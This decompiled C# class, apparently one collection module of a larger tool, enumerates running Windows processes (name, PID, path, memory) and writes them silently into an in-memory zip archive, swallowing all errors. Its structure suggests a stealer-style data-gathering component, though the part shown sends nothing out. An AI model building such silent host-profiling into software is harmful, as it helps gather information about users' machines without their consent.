using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Intelix.Helper;
using Intelix.Helper.Data;

namespace Intelix.Targets.Device
{
	// Token: 0x02000030 RID: 48
	public class ProcessDump : ITarget
	{
		// Token: 0x06000089 RID: 137 RVA: 0x000069C0 File Offset: 0x00004BC0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			try
			{
				List<ProcessWindows.ProcInfo> list = ProcessWindows.GetProcInfos().ToList<ProcessWindows.ProcInfo>();
				bool flag = list.Count == 0;
				if (!flag)
				{
					int totalWidth = Math.Max("Name".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string name = p.Name;
						return (name != null) ? name.Length : 0;
					}));
					int totalWidth2 = Math.Max("PID".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string pid = p.Pid;
						return (pid != null) ? pid.Length : 0;
					}));
					int totalWidth3 = Math.Max("Path".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string path = p.Path;
						return (path != null) ? path.Length : 0;
					}));
					int totalWidth4 = Math.Max("Mem".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string memory = p.Memory;
						return (memory != null) ? memory.Length : 0;
					}));
					string text = string.Concat(new string[]
					{
						"Name".PadRight(totalWidth),
						" | ",
						"PID".PadRight(totalWidth2),
						" | ",
						"Path".PadRight(totalWidth3),
						" | ",
						"Mem".PadRight(totalWidth4)
					});
					string value = new string('-', text.Length);
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.AppendLine(text);
					stringBuilder.AppendLine(value);
					IOrderedEnumerable<ProcessWindows.ProcInfo> source = from x in list
					orderby x.Name ?? string.Empty
					select x;
					foreach (ProcessWindows.ProcInfo procInfo in source.ThenBy(x => 
					{
						int result;
						return (!int.TryParse(x.Pid, out result)) ? int.MaxValue : result;
					}))
					{
						stringBuilder.AppendLine(string.Concat(new string[]
						{
							(procInfo.Name ?? "Unknown").PadRight(totalWidth),
							" | ",
							(procInfo.Pid ?? "Unknown").PadRight(totalWidth2),
							" | ",
							(procInfo.Path ?? "Unknown").PadRight(totalWidth3),
							" | ",
							(procInfo.Memory ?? "Unknown").PadRight(totalWidth4)
						}));
					}
					zip.AddTextFile("ProcessList.txt", stringBuilder.ToString());
				}
			}
			catch
			{
			}
		}
	}
}
